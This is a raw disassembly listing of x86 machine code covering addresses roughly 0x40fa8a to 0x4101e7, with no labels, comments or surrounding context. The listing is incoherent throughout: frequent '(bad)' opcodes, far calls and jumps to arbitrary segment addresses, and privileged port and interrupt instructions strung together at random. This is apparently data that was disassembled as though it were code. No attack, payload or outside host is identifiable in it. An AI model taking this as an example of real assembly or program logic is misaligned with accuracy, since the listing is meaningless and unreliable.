  40fa8a:	bound  ebx,QWORD PTR [eax+ebp*4]
  40fa8d:	and    ah,0xbf
  40fa90:	ins    DWORD PTR es:[edi],dx
  40fa91:	test   DWORD PTR [edi+ebx*8+0x523f9a06],esp
  40fa98:	or     bl,ch
  40fa9a:	call   0x7c9e:0xbae06430
  40faa1:	lods   al,BYTE PTR ds:[esi]
  40faa2:	add    ecx,DWORD PTR [edx+0xe646404]
  40faa8:	test   bl,bh
  40faaa:	jb     0x40fafa
  40faac:	mov    WORD PTR [ebp+0x31],gs
  40faaf:	loop   0x40fb16
  40fab1:	mov    edi,DWORD PTR [eax+0x523f6043]
  40fab7:	je     0x40faec
  40fab9:	sub    DWORD PTR [eax],ecx
  40fabb:	fucomp st(1)
  40fabd:	xor    BYTE PTR ds:0x8b386424,dh
  40fac3:	sub    eax,DWORD PTR [edx]
  40fac5:	lods   eax,DWORD PTR ds:[esi]
  40fac6:	out    0x60,al
  40fac8:	mov    edi,?
  40faca:	(bad)  
  40facb:	xlat   BYTE PTR ds:[ebx]
  40facc:	gs jmp 0x1fa2:0xfcf37ec1
  40fad4:	test   DWORD PTR [edi+0x7f],ecx
  40fad7:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fad9:	mov    WORD PTR [edx-0x166279d8],es
  40fadf:	xor    dh,BYTE PTR [edi-0x13793da9]
  40fae5:	dec    edi
  40fae6:	add    eax,0x83f58080
  40faeb:	sahf   
  40faec:	mov    dl,0xd5
  40faee:	jl     0x40fb5f
  40faf0:	mov    ecx,0x8d44fcf0
  40faf5:	mov    BYTE PTR [edx],dh
  40faf7:	inc    ecx
  40faf8:	stos   BYTE PTR es:[edi],al
  40faf9:	scas   eax,DWORD PTR es:[edi]
  40fafa:	jae    0x40fb54
  40fafc:	iret   
  40fafd:	xlat   BYTE PTR ds:[ebx]
  40fafe:	inc    ebp
  40faff:	je     0x40fa82
  40fb01:	sub    edx,DWORD PTR [eax]
  40fb03:	mov    edx,eax
  40fb05:	xchg   esp,eax
  40fb06:	stos   BYTE PTR es:[edi],al
  40fb07:	dec    eax
  40fb08:	lods   al,BYTE PTR ds:[esi]
  40fb09:	adc    eax,0x12d7426c
  40fb0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb0f:	inc    edi
  40fb10:	mov    esp,0xdd8db543
  40fb15:	xchg   ebx,eax
  40fb16:	test   al,0x39
  40fb18:	add    DWORD PTR [edi],esp
  40fb1a:	out    0xf0,eax
  40fb1c:	xor    eax,0x81ea6e35
  40fb21:	or     dh,BYTE PTR [eax+0xdeb885d]
  40fb27:	call   0x3fae:0x5a92e4b3
  40fb2e:	nop
  40fb2f:	inc    edx
  40fb30:	jmp    0xb51c:0x9d8068e5
  40fb37:	stc    
  40fb38:	sbb    bh,BYTE PTR [edx-0x76e0627f]
  40fb3e:	idiv   DWORD PTR [ebp+0x77]
  40fb41:	adc    al,0xab
  40fb43:	mov    ah,0x2a
  40fb45:	cdq    
  40fb46:	jge    0x40fb78
  40fb48:	mov    eax,0xc7631489
  40fb4d:	pop    ebp
  40fb4e:	test   eax,0x8fd2983
  40fb53:	or     BYTE PTR [ecx],0x9e
  40fb56:	stc    
  40fb57:	dec    ebp
  40fb58:	xor    DWORD PTR [edi+0x60],0xeec878e6
  40fb5f:	sbb    BYTE PTR [edi+edx*2],0x94
  40fb63:	mov    ebp,0x7ab3dade
  40fb68:	sub    DWORD PTR [ebp-0x4ae605c7],0xffffffab
  40fb6f:	inc    edx
  40fb70:	push   es
  40fb71:	daa    
  40fb72:	jge    0x40fb8a
  40fb74:	js     0x40fb34
  40fb76:	icebp  
  40fb77:	jae    0x40fb17
  40fb79:	fcomi  st,st(6)
  40fb7b:	in     al,0xfe
  40fb7d:	mov    ah,0x9d
  40fb7f:	repz push 0x3ce8b2d
  40fb85:	dec    eax
  40fb86:	cmp    ah,cl
  40fb88:	dec    ebp
  40fb89:	lea    edi,[edi+0x5970c25e]
  40fb8f:	adc    edx,DWORD PTR [edx+eiz*4-0x10]
  40fb93:	add    ebp,eax
  40fb95:	pop    es
  40fb96:	jl     0x40fb32
  40fb98:	xor    ebx,edx
  40fb9a:	(bad)  
  40fb9b:	std    
  40fb9c:	pop    esi
  40fb9d:	jo     0x40fb8a
  40fb9f:	dec    ebp
  40fba0:	leave  
  40fba1:	test   ch,cl
  40fba3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fba4:	and    al,0xa1
  40fba6:	imul   edi,DWORD PTR [ecx+0x4faa1173],0xffffffbf
  40fbad:	push   edi
  40fbae:	or     BYTE PTR [eax],0x9a
  40fbb1:	leave  
  40fbb2:	outs   dx,DWORD PTR ds:[esi]
  40fbb3:	adc    bl,bl
  40fbb5:	cli    
  40fbb6:	xor    ah,BYTE PTR [ebx]
  40fbb8:	mov    dh,0x60
  40fbba:	iret   
  40fbbb:	loopne 0x40fb79
  40fbbd:	lds    eax,FWORD PTR [eax]
  40fbbf:	jmp    0x40fbca
  40fbc1:	adc    DWORD PTR [esi],0x7746b234
  40fbc7:	sub    eax,0x20450699
  40fbcc:	pusha  
  40fbcd:	sub    al,BYTE PTR [ebp+0x1049385]
  40fbd3:	mov    bh,0xfd
  40fbd5:	sub    edx,DWORD PTR [ecx]
  40fbd7:	fcom   QWORD PTR [ecx+ecx*2]
  40fbda:	lds    esi,FWORD PTR [edi+0xe]
  40fbdd:	jecxz  0x40fbf0
  40fbdf:	jb     0xf7843775
  40fbe5:	cmp    al,0xc4
  40fbe7:	jmp    0x6b74e02d
  40fbec:	mov    al,0xd2
  40fbee:	mov    edi,DWORD PTR [esi+ebp*4+0x49]
  40fbf2:	pop    ebp
  40fbf3:	fld    QWORD PTR [ebx-0x240687de]
  40fbf9:	(bad)  [edx+0x2a]
  40fbfc:	and    al,0x58
  40fbfe:	daa    
  40fbff:	sbb    al,0xd5
  40fc01:	retf   0xe399
  40fc04:	xchg   ecx,eax
  40fc05:	jg     0x40fba1
  40fc07:	dec    ebx
  40fc08:	rol    BYTE PTR [ecx-0x8],cl
  40fc0b:	lds    esi,FWORD PTR [edi-0x3a]
  40fc0e:	xor    BYTE PTR [eax+esi*1+0x38f068c9],bl
  40fc15:	mov    ah,0xd3
  40fc17:	sbb    DWORD PTR es:[esi+0x1237cea7],ecx
  40fc1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc1f:	dec    esi
  40fc20:	jecxz  0x40fc98
  40fc22:	hlt    
  40fc23:	cld    
  40fc24:	ins    DWORD PTR es:[edi],dx
  40fc25:	or     esp,esp
  40fc27:	push   ebx
  40fc28:	push   eax
  40fc29:	adc    eax,0x6b44b3b6
  40fc2e:	into   
  40fc2f:	xlat   BYTE PTR ds:[ebx]
  40fc30:	scas   eax,DWORD PTR es:[edi]
  40fc31:	or     eax,0x8f712cc8
  40fc36:	mov    bh,0xf8
  40fc38:	test   DWORD PTR [ebp+0x10b700b4],ebp
  40fc3e:	loopne 0x40fcbd
  40fc40:	add    al,0x44
  40fc42:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40fc44:	es push 0x1fa68854
  40fc4a:	fiadd  DWORD PTR [ecx]
  40fc4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc4d:	jmp    0x4e1b:0x52874340
  40fc54:	push   esi
  40fc55:	fist   WORD PTR [ebx+0x666f7072]
  40fc5b:	ds pop esp
  40fc5d:	sahf   
  40fc5e:	(bad)  
  40fc5f:	js     0x40fc88
  40fc61:	out    dx,eax
  40fc62:	and    BYTE PTR [edx+0x76],al
  40fc65:	cmp    ah,dh
  40fc67:	and    DWORD PTR [ebp-0x7e],edx
  40fc6a:	xchg   ebx,eax
  40fc6b:	(bad)  
  40fc6c:	mov    bl,0x39
  40fc6e:	pop    eax
  40fc6f:	sub    eax,0x83cef0a5
  40fc74:	leave  
  40fc75:	mov    dh,0x1c
  40fc77:	pushf  
  40fc78:	lds    ebx,FWORD PTR [ebx]
  40fc7a:	and    BYTE PTR [edi],al
  40fc7c:	call   0x8a26c5e5
  40fc81:	leave  
  40fc82:	xor    ebp,DWORD PTR [ebx-0x13546d0b]
  40fc88:	in     al,dx
  40fc89:	pop    ss
  40fc8a:	xchg   ebp,eax
  40fc8b:	call   0xb920:0x244ea82
  40fc92:	add    al,0x5f
  40fc94:	rol    DWORD PTR [edx+0x0],1
  40fc97:	ret    0xdc3e
  40fc9a:	into   
  40fc9b:	adc    ebx,DWORD PTR [esi-0x6e0d6315]
  40fca1:	fild   DWORD PTR [ebx+edi*1-0x7b]
  40fca5:	push   esi
  40fca6:	jmp    0xd5e5:0x8ab77f32
  40fcad:	sub    ecx,DWORD PTR [eax+0x1cdad9c2]
  40fcb3:	imul   ebx,DWORD PTR [esi+ecx*4+0x24],0xffffffd8
  40fcb8:	mov    ah,0x74
  40fcba:	addr16 or al,0x36
  40fcbd:	shl    DWORD PTR [esi],cl
  40fcbf:	xchg   cl,ch
  40fcc1:	retf   
  40fcc2:	adc    BYTE PTR [eax],bl
  40fcc4:	(bad)  [edx+0x6ee2f0e8]
  40fcca:	cmp    DWORD PTR [ecx],0x20eb1afc
  40fcd0:	in     al,0xbb
  40fcd2:	or     DWORD PTR [edx+0x333cfc69],0x9636d2b0
  40fcdc:	push   edi
  40fcdd:	sub    DWORD PTR [edi+0x39],eax
  40fce0:	mov    edx,0xe7f90e54
  40fce5:	shl    BYTE PTR [edi],1
  40fce7:	std    
  40fce8:	gs addr16 cmp eax,0x309efa63
  40fcef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fcf0:	jno    0x40fc9d
  40fcf2:	mov    cs,WORD PTR [eax]
  40fcf4:	push   ebp
  40fcf5:	sti    
  40fcf6:	dec    edi
  40fcf7:	cs mov ebx,ecx
  40fcfa:	loopne 0x40fd63
  40fcfc:	mov    al,ds:0xc062b1a3
  40fd01:	add    esi,DWORD PTR [edi]
  40fd03:	sbb    eax,0x8fd3d68f
  40fd08:	push   esi
  40fd09:	(bad)  
  40fd0b:	cmp    ch,BYTE PTR [edx]
  40fd0d:	call   0xbdc2:0x48c6d658
  40fd14:	in     eax,dx
  40fd15:	mov    al,ds:0x19e31cc
  40fd1a:	push   esp
  40fd1b:	adc    BYTE PTR [eax+0x6c],cl
  40fd1e:	pop    esp
  40fd1f:	mov    BYTE PTR [ebp+0x29cf2185],dl
  40fd25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd26:	jmp    0x40fd23
  40fd28:	push   ebx
  40fd29:	push   0x69
  40fd2b:	pop    ss
  40fd2c:	add    BYTE PTR [ecx+ebp*8-0x8944ea0],bh
  40fd33:	das    
  40fd34:	(bad)  
  40fd35:	data16 cld 
  40fd37:	cld    
  40fd38:	out    dx,al
  40fd39:	push   0xbfd56d19
  40fd3e:	mov    al,0xf0
  40fd40:	cdq    
  40fd41:	cmp    BYTE PTR [eax+eax*1+0xfe727d8],dh
  40fd48:	and    DWORD PTR ds:0xeb6bbae6,edi
  40fd4e:	jmp    FWORD PTR [edx+0x2c]
  40fd51:	add    dl,al
  40fd53:	frstor [edi-0x60]
  40fd56:	pushf  
  40fd57:	call   0x2167e3d6
  40fd5c:	jne    0x40fd41
  40fd5e:	xchg   ebx,eax
  40fd5f:	fsub   QWORD PTR gs:[esp+ecx*8]
  40fd63:	daa    
  40fd64:	push   cs
  40fd65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd66:	das    
  40fd67:	je     0x40fd2f
  40fd69:	addr16 loopne 0x40fd6e
  40fd6c:	sub    dh,bh
  40fd6e:	nop
  40fd6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd70:	iret   
  40fd71:	mov    dh,0x4a
  40fd73:	push   esi
  40fd74:	adc    al,BYTE PTR [ecx]
  40fd76:	push   ebx
  40fd77:	mov    dl,0x65
  40fd79:	inc    ecx
  40fd7a:	xchg   BYTE PTR [ecx-0xd],ch
  40fd7d:	jmp    0x103d:0x6d3a403e
  40fd84:	call   0x64dc:0x76b190e0
  40fd8b:	inc    eax
  40fd8c:	mov    al,0x14
  40fd8e:	(bad)  
  40fd8f:	adc    al,0x3a
  40fd91:	xlat   BYTE PTR ds:[ebx]
  40fd92:	pop    ss
  40fd93:	cmp    ebx,eax
  40fd95:	mov    esp,0x76fd41f0
  40fd9a:	pop    es
  40fd9b:	fs std 
  40fd9d:	jl     0x40fe08
  40fd9f:	stc    
  40fda0:	ins    BYTE PTR es:[edi],dx
  40fda1:	into   
  40fda2:	mov    esi,0x1891fe81
  40fda7:	loope  0x40fdc9
  40fda9:	sti    
  40fdaa:	dec    ebp
  40fdab:	mov    ebx,0x961e9172
  40fdb0:	cmp    DWORD PTR [esi+0x4e],esp
  40fdb3:	pop    ecx
  40fdb4:	or     eax,ebp
  40fdb6:	aad    0x82
  40fdb8:	dec    edx
  40fdb9:	lods   al,BYTE PTR ds:[esi]
  40fdba:	or     DWORD PTR [ebx+0x42],esp
  40fdbd:	pop    ecx
  40fdbe:	dec    ecx
  40fdbf:	push   esp
  40fdc0:	mov    al,ds:0x7082aa9a
  40fdc5:	lahf   
  40fdc6:	rcl    BYTE PTR [ebx-0x2731f919],cl
  40fdcc:	add    al,0xce
  40fdce:	into   
  40fdcf:	adc    al,BYTE PTR [edx]
  40fdd1:	pop    ecx
  40fdd2:	mov    eax,0x6e2bbb8b
  40fdd7:	(bad)  
  40fdd8:	mov    ds:0xba05ca61,eax
  40fddd:	mov    eax,ds:0xc8325e4a
  40fde2:	xor    BYTE PTR [ebx+esi*2],bl
  40fde5:	mov    WORD PTR [ebp-0x626bbf7d],fs
  40fdeb:	shl    BYTE PTR [ecx+0x373935e0],cl
  40fdf1:	adc    eax,0xe92bbfd4
  40fdf6:	pop    esi
  40fdf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fdf8:	call   0xb0c7:0x9db6c471
  40fdff:	add    dh,BYTE PTR [ebx-0x13]
  40fe02:	cmp    DWORD PTR [eax-0x31],edi
  40fe05:	ss aam 0x8b
  40fe08:	daa    
  40fe09:	std    
  40fe0a:	jg     0x40fdc8
  40fe0c:	inc    ebp
  40fe0d:	xacquire xchg DWORD PTR [ecx-0x59b8ba13],edi
  40fe14:	and    ebp,ecx
  40fe16:	or     DWORD PTR [edi+edi*2],esp
  40fe19:	or     bl,ah
  40fe1b:	dec    esi
  40fe1c:	mov    al,0xa
  40fe1e:	xchg   esi,eax
  40fe1f:	mov    bh,BYTE PTR [edx+0x7e2cd052]
  40fe25:	dec    ebx
  40fe26:	mov    esp,0x9b69a655
  40fe2b:	xchg   esp,eax
  40fe2c:	sbb    BYTE PTR [ebx-0x79],bh
  40fe2f:	xchg   ebp,eax
  40fe30:	xor    bh,BYTE PTR [ecx]
  40fe32:	push   edi
  40fe33:	lea    esp,[ebx]
  40fe35:	and    al,0xfe
  40fe37:	into   
  40fe38:	or     eax,0x6aa5e848
  40fe3d:	add    BYTE PTR ds:0x1112aea4,0xe9
  40fe44:	dec    edx
  40fe45:	and    al,0x59
  40fe47:	inc    ebx
  40fe48:	arpl   bx,bp
  40fe4a:	pop    ebp
  40fe4b:	cmp    ch,bl
  40fe4d:	mov    bl,0xdb
  40fe4f:	fisttp WORD PTR [edx-0x78]
  40fe52:	sub    DWORD PTR [esi-0x28b72a7f],edi
  40fe58:	add    al,0xf9
  40fe5a:	mov    esp,0x1b8a7649
  40fe5f:	stos   DWORD PTR es:[edi],eax
  40fe60:	and    ch,dl
  40fe62:	das    
  40fe63:	pop    ss
  40fe64:	lods   eax,DWORD PTR ds:[esi]
  40fe65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe66:	xchg   edx,eax
  40fe67:	sub    ah,ch
  40fe69:	xlat   BYTE PTR ds:[ebx]
  40fe6a:	xchg   ebp,eax
  40fe6b:	inc    DWORD PTR [edx+0x71]
  40fe6e:	test   al,0x58
  40fe70:	jb     0x40fec1
  40fe72:	das    
  40fe73:	adc    eax,0x1540195a
  40fe78:	gs es adc eax,0xbb62682
  40fe7f:	add    DWORD PTR [ebx-0x554403bd],0xffffff81
  40fe86:	pusha  
  40fe87:	jmp    0x90b0322e
  40fe8c:	femms  
  40fe8e:	into   
  40fe8f:	ss ret 0x5bde
  40fe93:	inc    esp
  40fe94:	loope  0x40febe
  40fe96:	mov    BYTE PTR [eax+ebp*4-0x46],ch
  40fe9a:	aas    
  40fe9b:	mov    ah,al
  40fe9d:	xor    al,0x72
  40fe9f:	dec    ebx
  40fea0:	jmp    0x4970:0x9a0abed2
  40fea7:	daa    
  40fea8:	pop    edx
  40fea9:	popa   
  40feaa:	add    al,0x7b
  40feac:	sub    eax,0x601884cf
  40feb1:	pusha  
  40feb2:	inc    edi
  40feb3:	ja     0x40fe80
  40feb5:	lahf   
  40feb6:	ins    DWORD PTR es:[edi],dx
  40feb7:	out    0x0,al
  40feb9:	aas    
  40feba:	or     BYTE PTR [ecx-0x67793af],cl
  40fec0:	or     eax,edi
  40fec2:	into   
  40fec3:	pop    ds
  40fec4:	test   ebp,esp
  40fec6:	mov    al,0x42
  40fec8:	jecxz  0x40fe53
  40feca:	fwait
  40fecb:	lds    eax,FWORD PTR [edx-0x52]
  40fece:	in     al,0x72
  40fed0:	or     DWORD PTR [esi],esi
  40fed2:	add    eax,DWORD PTR [esi]
  40fed4:	dec    esi
  40fed5:	xlat   BYTE PTR ds:[ebx]
  40fed6:	lods   eax,DWORD PTR ds:[esi]
  40fed7:	sbb    al,0x33
  40fed9:	xchg   BYTE PTR ds:0x3cd1e6f2,ah
  40fedf:	xchg   esp,eax
  40fee0:	(bad)  
  40fee1:	sbb    BYTE PTR ds:0x95284ec8,dl
  40fee7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fee8:	xor    esi,DWORD PTR ss:[ecx+0xd]
  40feec:	nop
  40feed:	inc    ebp
  40feee:	push   esi
  40feef:	mov    esi,0xaa708072
  40fef4:	das    
  40fef5:	dec    eax
  40fef6:	mov    ds:0xb0ef078e,al
  40fefb:	or     al,0xb4
  40fefd:	inc    esi
  40fefe:	aam    0x48
  40ff00:	call   0xaef5:0x1e01eeda
  40ff07:	xchg   ecx,eax
  40ff08:	outs   dx,DWORD PTR ds:[esi]
  40ff09:	lds    esi,FWORD PTR [ebx+0x186a759a]
  40ff0f:	cmp    al,0xa1
  40ff11:	dec    ebx
  40ff12:	clc    
  40ff13:	int3   
  40ff14:	mov    cl,0xb0
  40ff16:	xchg   ebx,eax
  40ff17:	fidivr DWORD PTR [ecx]
  40ff19:	daa    
  40ff1a:	dec    esi
  40ff1b:	ds scas eax,DWORD PTR es:[edi]
  40ff1d:	mov    ch,0xcb
  40ff1f:	push   ss
  40ff20:	xor    DWORD PTR [edi+0x66032c50],esp
  40ff26:	cli    
  40ff27:	inc    eax
  40ff28:	mov    bl,0x65
  40ff2a:	push   esi
  40ff2b:	ret    0xdfb2
  40ff2e:	push   ss
  40ff2f:	and    esp,ebp
  40ff31:	(bad)  
  40ff32:	cmc    
  40ff33:	(bad)  
  40ff34:	imul   eax,DWORD PTR [ebx+0x3d403adb],0x4c
  40ff3b:	and    al,0x3b
  40ff3d:	lahf   
  40ff3e:	std    
  40ff3f:	out    dx,eax
  40ff40:	inc    esp
  40ff41:	imul   esi,DWORD PTR [ebp-0x4b9f981b],0xffffff9d
  40ff48:	in     al,dx
  40ff49:	add    ch,BYTE PTR [ecx-0x38]
  40ff4c:	clc    
  40ff4d:	sub    cl,dl
  40ff4f:	out    dx,al
  40ff50:	mov    ebp,DWORD PTR [eax+0x14]
  40ff53:	popf   
  40ff54:	mov    al,0x5c
  40ff56:	push   ebx
  40ff57:	outs   dx,DWORD PTR ds:[esi]
  40ff58:	lods   al,BYTE PTR ds:[esi]
  40ff59:	sbb    bl,BYTE PTR [ebp+0x21a3cbf5]
  40ff5f:	inc    ebp
  40ff60:	jne    0x40fef3
  40ff62:	pushf  
  40ff63:	mov    esi,0x36db4629
  40ff68:	daa    
  40ff69:	fiadd  DWORD PTR ds:0xc8a700ab
  40ff6f:	mov    ebp,0xe5a00759
  40ff74:	in     eax,dx
  40ff75:	test   BYTE PTR [edx],0xdb
  40ff78:	inc    esi
  40ff79:	stc    
  40ff7a:	push   0x7411bf0f
  40ff7f:	inc    edx
  40ff80:	cmp    BYTE PTR [esi+0xe],bl
  40ff83:	mov    ds:0x851de31e,eax
  40ff88:	inc    esi
  40ff89:	(bad)  
  40ff8a:	data16 loopne 0x40ff53
  40ff8d:	add    ebx,eax
  40ff8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff90:	mov    cl,0x35
  40ff92:	inc    edx
  40ff93:	and    DWORD PTR [eax+0x26],eax
  40ff96:	jno    0x40ffdc
  40ff98:	sbb    ecx,DWORD PTR [ecx+edi*4-0x6b7a0f58]
  40ff9f:	mov    esi,fs
  40ffa1:	pop    ebx
  40ffa2:	push   0xffffffc4
  40ffa4:	and    ebp,DWORD PTR [esi-0x1f]
  40ffa7:	aam    0x4b
  40ffa9:	mov    esi,0x945e51c
  40ffae:	add    dl,al
  40ffb0:	stos   BYTE PTR es:[edi],al
  40ffb1:	or     eax,0x42acc1ba
  40ffb6:	out    dx,al
  40ffb7:	push   ss
  40ffb8:	mov    bl,0x7e
  40ffba:	(bad)  
  40ffbb:	mov    eax,0x33308d32
  40ffc0:	mov    dh,0x5b
  40ffc2:	jecxz  0x40ff7d
  40ffc4:	aas    
  40ffc5:	js     0x41001a
  40ffc7:	sbb    DWORD PTR [edx+0x78],ebp
  40ffca:	and    al,BYTE PTR [edx+eiz*2+0x18]
  40ffce:	fldenv [ebx]
  40ffd0:	dec    eax
  40ffd1:	cmp    eax,0x47a11d30
  40ffd6:	in     al,dx
  40ffd7:	and    al,0x10
  40ffd9:	(bad)  
  40ffdb:	xchg   ebp,eax
  40ffdc:	add    BYTE PTR [ebx-0x1fe5e666],dl
  40ffe2:	adc    ebx,DWORD PTR [ecx+0x2b]
  40ffe5:	stos   DWORD PTR es:[edi],eax
  40ffe6:	xor    eax,DWORD PTR [ebx]
  40ffe8:	cmp    DWORD PTR [ebx-0x5d],ebx
  40ffeb:	lahf   
  40ffec:	popf   
  40ffed:	mov    ds:0x9cb03f5d,eax
  40fff2:	test   DWORD PTR [ecx-0x59],0x63d740cb
  40fff9:	outs   dx,BYTE PTR ds:[esi]
  40fffa:	enter  0xca45,0x6c
  40fffe:	adc    BYTE PTR [esi+edx*4],dl
  410001:	cmp    al,0x25
  410003:	mov    fs,ecx
  410005:	dec    edx
  410006:	push   edi
  410007:	std    
  410008:	nop
  410009:	and    eax,0x61f585d5
  41000e:	xor    ebx,DWORD PTR [ebx+ebp*1+0xc4a347f]
  410015:	mov    edx,0x3be5f615
  41001a:	(bad)  
  41001b:	or     bl,BYTE PTR [edx-0x44]
  41001e:	dec    DWORD PTR [ebx-0x1a]
  410021:	mov    ds:0xeda8bcb5,al
  410026:	lock jl 0x410060
  410029:	cwde   
  41002a:	scas   al,BYTE PTR es:[edi]
  41002b:	xor    bh,BYTE PTR [eax+esi*1]
  41002e:	(bad)  
  41002f:	(bad)  
  410031:	mov    eax,ds:0xe54f46ca
  410036:	sub    al,0xad
  410038:	mov    esp,0xe34688cd
  41003d:	stos   DWORD PTR es:[edi],eax
  41003e:	gs hlt 
  410040:	jne    0x40fff4
  410042:	and    DWORD PTR ss:[ecx+0x7c7bdb34],eax
  410049:	lahf   
  41004a:	jmp    FWORD PTR [eax-0x2b]
  41004d:	or     ebx,eax
  41004f:	cmp    al,0x56
  410051:	shld   DWORD PTR [ebx],ebp,0xca
  410055:	sar    DWORD PTR [ecx-0x5c],1
  410058:	dec    edi
  410059:	dec    DWORD PTR [esi+0x75c01357]
  41005f:	mov    dl,0x7f
  410061:	xor    BYTE PTR ds:0x74a56b63,dl
  410067:	popf   
  410068:	test   BYTE PTR [edi],ch
  41006a:	mov    al,0x59
  41006c:	(bad)  
  41006e:	test   eax,0xd1a2d2d1
  410073:	mov    BYTE PTR [ebp-0x32],dh
  410076:	jge    0x41007d
  410078:	pop    esp
  410079:	pop    edx
  41007a:	nop
  41007b:	jne    0x4100e2
  41007d:	out    dx,al
  41007e:	int3   
  41007f:	aam    0xe5
  410081:	or     ah,bh
  410083:	int3   
  410084:	mov    al,ds:0xfbf93505
  410089:	sar    DWORD PTR [edx-0xa],0x7a
  41008d:	dec    eax
  41008e:	(bad)  
  41008f:	push   edx
  410090:	int3   
  410091:	mov    ah,0x13
  410093:	ss jns 0x41005e
  410096:	popf   
  410097:	cmp    cl,bl
  410099:	and    eax,0x5dca1943
  41009e:	pop    es
  41009f:	aam    0x3
  4100a1:	dec    esi
  4100a2:	cmp    ch,BYTE PTR [eax]
  4100a4:	lods   eax,DWORD PTR ds:[esi]
  4100a5:	cmp    esi,edx
  4100a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100a8:	add    bl,bh
  4100aa:	sti    
  4100ab:	je     0x4100bf
  4100ad:	dec    esi
  4100ae:	mov    bh,0xb6
  4100b0:	add    eax,0xcaea7542
  4100b5:	je     0x4100d0
  4100b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100b8:	popa   
  4100b9:	dec    ecx
  4100ba:	sbb    DWORD PTR [edx+0x1582a539],ebp
  4100c0:	in     al,dx
  4100c1:	xchg   esp,eax
  4100c2:	jo     0x4100e7
  4100c4:	lds    ebx,FWORD PTR [esp+edx*8+0x18]
  4100c8:	lods   al,BYTE PTR ds:[esi]
  4100c9:	imul   ebx,DWORD PTR [edi],0x8
  4100cc:	jnp    0x41008d
  4100ce:	mov    bl,0xc7
  4100d0:	pushf  
  4100d1:	jnp    0x41014d
  4100d3:	and    BYTE PTR [edi+0x6b],bl
  4100d6:	and    BYTE PTR [edi+0x6b],al
  4100d9:	sti    
  4100da:	lods   al,BYTE PTR ds:[esi]
  4100db:	mov    ebx,0xad8d76c0
  4100e0:	mov    cs,WORD PTR [ecx+edx*1]
  4100e3:	call   0xad6d1616
  4100e8:	daa    
  4100e9:	sahf   
  4100ea:	sbb    cl,BYTE PTR [edi]
  4100ec:	into   
  4100ed:	or     eax,0x6b47b547
  4100f2:	stos   BYTE PTR es:[edi],al
  4100f3:	jno    0x410134
  4100f5:	ret    0xc025
  4100f8:	ins    DWORD PTR es:[edi],dx
  4100f9:	mov    esi,0xc39b74dc
  4100fe:	jmp    0x5bd9b6f6
  410103:	mov    ch,0xa1
  410105:	push   0x24
  410107:	jne    0x4100eb
  410109:	leave  
  41010a:	cmp    BYTE PTR [eax+eiz*8],al
  41010d:	mov    al,fs:0x98a8dced
  410113:	mov    ds:0xa0eb5cc3,eax
  410118:	mov    esp,0x5ab01fbf
  41011d:	bound  edi,QWORD PTR [edx]
  41011f:	and    esi,DWORD PTR [eax+ebx*8-0x47]
  410123:	adc    al,0xa6
  410125:	add    al,0x1a
  410127:	jecxz  0x4100be
  410129:	push   0x19
  41012b:	sub    eax,DWORD PTR [esi+0x50]
  41012e:	fwait
  41012f:	jmp    0x4100b2
  410131:	xchg   ebp,eax
  410132:	imul   edi,DWORD PTR [esi+eax*1-0x4c4fdedf],0x175cc50
  41013d:	sbb    al,BYTE PTR [ebp+ecx*1+0x70]
  410141:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410142:	lea    edx,[edi+0x6da6e6b5]
  410148:	(bad)  
  410149:	cld    
  41014a:	jecxz  0x4100f5
  41014c:	div    BYTE PTR [edi+eiz*1+0x598bed51]
  410153:	push   ecx
  410154:	xchg   BYTE PTR [esi+0x25],cl
  410157:	cmp    al,0xe0
  410159:	outs   dx,BYTE PTR ds:[esi]
  41015a:	or     eax,0x2268ca62
  41015f:	int    0x16
  410161:	in     eax,dx
  410162:	push   ecx
  410163:	cld    
  410164:	and    al,BYTE PTR [edx]
  410166:	jg     0x410159
  410168:	push   ebx
  410169:	mov    ebp,DWORD PTR [ebx+0x64248886]
  41016f:	test   BYTE PTR [edi],bl
  410171:	jnp    0x4101c5
  410173:	out    0x80,eax
  410175:	add    eax,0xafae7ed
  41017a:	scas   eax,DWORD PTR es:[edi]
  41017b:	push   cs
  41017c:	das    
  41017d:	jo     0x41010b
  41017f:	inc    edi
  410180:	ret    
  410181:	aaa    
  410182:	mul    BYTE PTR [edi+ebx*8]
  410185:	xor    al,0x78
  410187:	jmp    0x4101a0
  410189:	test   eax,0x82414016
  41018e:	dec    edx
  41018f:	pop    ds
  410190:	out    0xdb,eax
  410192:	dec    edx
  410193:	clc    
  410194:	lsl    edi,sp
  410197:	mov    WORD PTR [edi+ecx*8-0x54dd05a6],ss
  41019e:	sub    BYTE PTR [ecx-0x15],bl
  4101a1:	xchg   edx,eax
  4101a2:	and    edx,DWORD PTR [edi+0x29]
  4101a5:	repnz fdivrp st(7),st
  4101a8:	mov    esp,0x11bc9cf1
  4101ad:	lock lods eax,DWORD PTR ds:[esi]
  4101af:	inc    ebx
  4101b1:	mov    DWORD PTR [edx+0x1747fb78],ebp
  4101b7:	mov    WORD PTR [ebp-0x39f6688d],es
  4101bd:	cld    
  4101be:	nop
  4101bf:	les    eax,FWORD PTR [ecx-0x43]
  4101c2:	sub    eax,0x8a13d033
  4101c7:	adc    al,0x56
  4101c9:	mov    BYTE PTR [ebx+esi*2+0x24f1526a],cl
  4101d0:	pop    ds
  4101d1:	pop    DWORD PTR [ebp+0x3fa7858]
  4101d7:	fistp  QWORD PTR [edi+0x60]
  4101da:	(bad)  
  4101db:	fsubr  DWORD PTR [edx-0x33b15339]
  4101e1:	jecxz  0x4101cc
  4101e3:	enter  0xf3a3,0xe4
  4101e7:	call   0x2ee5:0x4277eb9f
